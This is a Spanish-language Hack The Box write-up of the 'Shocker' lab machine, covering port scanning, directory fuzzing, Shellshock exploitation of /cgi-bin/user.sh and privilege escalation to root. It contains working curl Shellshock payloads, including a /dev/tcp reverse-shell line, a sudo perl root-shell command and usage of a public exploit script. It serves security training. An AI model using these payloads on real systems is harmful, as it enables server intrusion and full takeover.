---
layout: single
title: Shocker - Hack The Box
excerpt: "Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al fuzzing pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**, gracias a este podremos conectarnos de manera remota a la maquina y usando un archivo con privilegios root, escalaremos privilegios."
date: 2023-03-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-shocker/shocker_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - ShellShock Attack
  - Remote Code Execution - RCE
  - SUDO Exploitation
  - Remote Command Injection - RCI
  - RCI - CVE-2014-6278, 2014-6271
  - OSCP Style
---
![](/assets/images/htb-writeup-shocker/shocker_logo.png)
Esta fue una máquina algo compleja porque tuve que investigar bastante, pues al hacer los escaneos no mostraba nada que me pudiera ayudar. Sin embargo, gracias al fuzzing pude encontrar una linea de investigación que me llevo a descubrir el **ataque ShellShock**, gracias a este podremos conectarnos de manera remota a la maquina y usando un archivo con privilegios root, escalaremos privilegios.

# Recopilación de Información
## Traza ICMP
Vamos a realizar un ping para saber si la máquina esta conectada y en base al TTL vamos a saber que SO tiene.
```
ping -c 4 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
64 bytes from 10.10.10.56: icmp_seq=1 ttl=63 time=145 ms
64 bytes from 10.10.10.56: icmp_seq=2 ttl=63 time=142 ms
64 bytes from 10.10.10.56: icmp_seq=3 ttl=63 time=138 ms
64 bytes from 10.10.10.56: icmp_seq=4 ttl=63 time=138 ms

--- 10.10.10.56 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 137.507/140.671/145.492/3.335 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.56 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 13:09 CST
Initiating SYN Stealth Scan at 13:09
Scanning 10.10.10.56 [65535 ports]
Discovered open port 80/tcp on 10.10.10.56
Completed SYN Stealth Scan at 13:09, 28.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.56
Host is up, received user-set (1.6s latency).
Scanned at 2023-03-07 13:09:10 CST for 28s
Not shown: 56232 filtered tcp ports (no-response), 9302 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.21 seconds
           Raw packets sent: 127603 (5.615MB) | Rcvd: 9358 (374.340KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solamente hay un puerto abierto, ya sabemos que es una página web pero aun asi hagamos un escaneo de servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p80 10.10.10.56 -oN targeted                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 13:10 CST
Nmap scan report for 10.10.10.56
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Ya sabiamos que es una página web, entonces vamos a verla.

# Analisis de Vulnerabilidades
## Analizando Puerto 80
Vamos a entrar.

![](/assets/images/htb-writeup-shocker/Captura1.png)

Jejeje que raro el monito ese, pero no hay nada más. Que nos dice Wappalizer:

![](/assets/images/htb-writeup-shocker/Captura2.png)

No pues nada, no tenemos casi nada de información. Vamos a hacer un fuzzing para ver si tiene alguna subpágina:
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   200        9 L      13 W       137 Ch      "# directory-list-2.3-medium.txt"                                           
000000003:   200        9 L      13 W       137 Ch      "# Copyright 2007 James Fisher"                                             
000000007:   200        9 L      13 W       137 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000035:   403        11 L     32 W       294 Ch      "cgi-bin"                                                                   
000000013:   200        9 L      13 W       137 Ch      "#"                                                                         
000000014:   200        9 L      13 W       137 Ch      "http://10.10.10.56//"                                                      
000000012:   200        9 L      13 W       137 Ch      "# on atleast 2 different hosts"                                            
000000011:   200        9 L      13 W       137 Ch      "# Priority ordered case sensative list, where entries were found"          
000000010:   200        9 L      13 W       137 Ch      "#"                                                                         
000000009:   200        9 L      13 W       137 Ch      "# Suite 300, San Francisco, California, 94105, USA."                       
000000006:   200        9 L      13 W       137 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000008:   200        9 L      13 W       137 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                
000000005:   200        9 L      13 W       137 Ch      "# This work is licensed under the Creative Commons"                        
000000002:   200        9 L      13 W       137 Ch      "#"                                                                         
000000004:   200        9 L      13 W       137 Ch      "#"                                                                         
000000083:   403        11 L     32 W       292 Ch      "icons"                                                                     
000045240:   200        9 L      13 W       137 Ch      "http://10.10.10.56//"                                                      
000095524:   403        11 L     32 W       300 Ch      "server-status"                                                             

Total time: 1285.770
Processed Requests: 220560
Filtered Requests: 220542
Requests/sec.: 171.5391
```
Mmmm hay algunas que son de interes como la cgi-bin pero por el estado que muestra, no las podremos ver aunque sabemos que si existen. Que podemos hacer ahora?

Pues toca investigar, quiza el **cgi-bin** tenga un exploit, vamos a buscar. Encontre algo gracias a **HackTricks**:

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

Aqui se habla sobre el ataque **ShellShock** pero esto que es?

**Shellshock es una vulnerabilidad asociada al CVE-2014-6271 y afecta a la shell de Linux “Bash” hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos.**

Aqui más información importante que nos da **OWASP**:

https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf

Incluso menciona que existe un script en **nmap** para detectar si una victima, en este caso el servidor web de Apache, es vulnerable al **ataque ShellShock**, para que este funciones debemos averiguar si existe el directorio **cgi-bin** y el archivo **user.sh**, nosotros ya encontramos el **cgi-bin** pero no el **user.sh**, veamos que pasa si lo ponemos junto al **cgi-bin** en el buscado:

![](/assets/images/htb-writeup-shocker/Captura3.png)

Nos descargo un archivo, vamos a verlo:
```
cat user.sh       
Content-Type: text/plain

Just an uptime test script

 18:52:25 up  3:47,  0 users,  load average: 0.01, 0.02, 0.00
```
Excelente! Dicho archivo si existe, es momento de probar el script de nmap:
```
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 20:07 CST
Nmap scan report for 10.10.10.56
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```
Aqui la página de nmap de donde saque el script:

https://nmap.org/nsedoc/scripts/http-shellshock.html

Y si es vulnerable, vamos a utilizar este ataque para ganar acceso a la máquina.

# Explotación de Vulnerabilidades
Despues de leer el siguiente articulo:

https://blog.cloudflare.com/inside-shellshock/

Utilizaremos la herramienta **curl** para usar el **ataque ShellShock**, hagamos una prueba:
```
curl -H "User-Agent: () { :; }; /usr/bin/whoami" 'http://10.10.10.56/cgi-bin/user.sh'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
```
Nos manda un error, he visto en ejemplos que usan el comando **echo** quiza por eso fallo, probemoslo:
```
curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" 'http://10.10.10.56/cgi-bin/user.sh'    
shelly
```
Muy bien, para que quede más claro de que podemos inyectar comandos, lanzemos una Traza ICMP para probarlo:
* Activamos un capturador con **tcpdum**:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
* Escribimos la petición para mandar un ping con curl:
```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'ping -c 4 10.10.14.16'" 'http://10.10.10.56/cgi-bin/user.sh'
```
* La activamos y vemos el resultado:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:32:45.338204 IP 10.10.10.56 > 10.10.14.16: ICMP echo request, id 1578, seq 1, length 64
20:32:45.338214 IP 10.10.14.16 > 10.10.10.56: ICMP echo reply, id 1578, seq 1, length 64
20:32:46.339937 IP 10.10.10.56 > 10.10.14.16: ICMP echo request, id 1578, seq 2, length 64
20:32:46.339948 IP 10.10.14.16 > 10.10.10.56: ICMP echo reply, id 1578, seq 2, length 64
20:32:47.341043 IP 10.10.10.56 > 10.10.14.16: ICMP echo request, id 1578, seq 3, length 64
20:32:47.341054 IP 10.10.14.16 > 10.10.10.56: ICMP echo reply, id 1578, seq 3, length 64
20:32:48.342873 IP 10.10.10.56 > 10.10.14.16: ICMP echo request, id 1578, seq 4, length 64
20:32:48.342884 IP 10.10.14.16 > 10.10.10.56: ICMP echo reply, id 1578, seq 4, length 64
```
Muy bien, ahora aqui podemos hacer dos cosas, una seria cargar un payload con una Reverse Shell para que nos conecte o directamente pedirle esa conexión sin cargar el Payload, hagamos lo segundo:
+ Activamos una netcat:
```
nc -nvlp 443                                                                         
listening on [any] 443 ...
```
* Agregamos la Reverse Shell en el comando de curl:
```
curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/Tu_IP/443 0>&1" 'http://10.10.10.56/cgi-bin/user.sh'
```
Aqui nos apoyamos de la siguiente página web que te genera Reverse Shells en casi cualquier lenguaje:

https://www.revshells.com/

* Activamos el comando y vemos el resultado:
```
nc -nvlp 443                                                                         
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.56] 53874
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```
Y estamos dentro! Busquemos la flag del usuario:
```
shelly@Shocker:/usr/lib/cgi-bin$ cd /home
cd /home
shelly@Shocker:/home$ ls
ls
shelly
shelly@Shocker:/home$ cd shelly 
cd shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
```
Es momento de escalar privilegios.

# Post Explotación
Como siempre, veamos los privilegios que tenemos:
```
shelly@Shocker:/home/shelly$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
No veo algo que nos pueda servir, aunque me llama la atención el plugdev, el lxd y lpadmin. Antes de investigarlos, veamos si tenemos algún permiso como SUDO en un archivo:
```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Podemos ejecutar **perl** como root, busquemos en GTObins si hay alguna forma de escalar privilegios.

https://gtfobins.github.io/gtfobins/perl/#sudo

Si hay una forma, intentemosla:
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
cd /root
ls
root.txt
cat root.txt
```
Listo! Ya conseguimos las flags de esta máquina.

# Otras Formas
Existe un exploit que podemos usar para poder conectarnos de manera remota, busquemoslo con **Searchsploit**:
```
searchsploit shellshock
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                    | cgi/remote/38849.rb
Apache mod_cgi - 'Shellshock' Remote Command Injection                                                      | linux/remote/34900.py
Bash - 'Shellshock' Environment Variables Command Injection                                                 | linux/remote/34766.php
Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                                               | cgi/webapps/34895.rb
Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                                           | hardware/remote/39568.py
dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)                                     | linux/remote/36933.py
GNU Bash - 'Shellshock' Environment Variable Command Injection                                              | linux/remote/34765.txt
IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)                              | cgi/remote/39918.rb
...
```
El que nos interesa es el **Apache mod_cgi - 'Shellshock' Remote Command Injection**, vamos a probarlo.

### Probando Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
```
searchsploit -m linux/remote/34900.py
  Exploit: Apache mod_cgi - 'Shellshock' Remote Command Injection
      URL: https://www.exploit-db.com/exploits/34900
     Path: /usr/share/exploitdb/exploits/linux/remote/34900.py
    Codes: CVE-2014-6278, CVE-2014-6271
 Verified: True
File Type: Python script, ASCII text executable
```
Bien, si lo analizamos vienen instrucciones sobre como usarlo:
```
python2 Shellshock.py                            


                Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
```
Osea que con activarlo va a generar un payload con una Reverse Shell y activara una netcat que nos conectara automaticamente, hagamoslo:
```
 python2 Shellshock.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.16 lport=443 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami 
shelly
```
Y listo estamos dentro.

Ahora para escalar privilegios, existe un exploit hecho por tito **S4vitar** y **vowkin** en donde el epxloit abusa del privilegio **lxd**, intenta usarlo!

```
searchsploit lxd
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                                  | linux/local/46978.sh
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

## Links de Investigación
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
* https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
* https://nmap.org/nsedoc/scripts/http-shellshock.html
* https://blog.cloudflare.com/inside-shellshock/
* https://deephacking.tech/shellshock-attack-pentesting-web/
* https://www.zonasystem.com/2020/07/tipos-de-conexiones-directas-inversas-transferencia-ficheros-netcat-nc.html
* https://www.revshells.com/
* https://gtfobins.github.io/gtfobins/perl/#sudo

# FIN

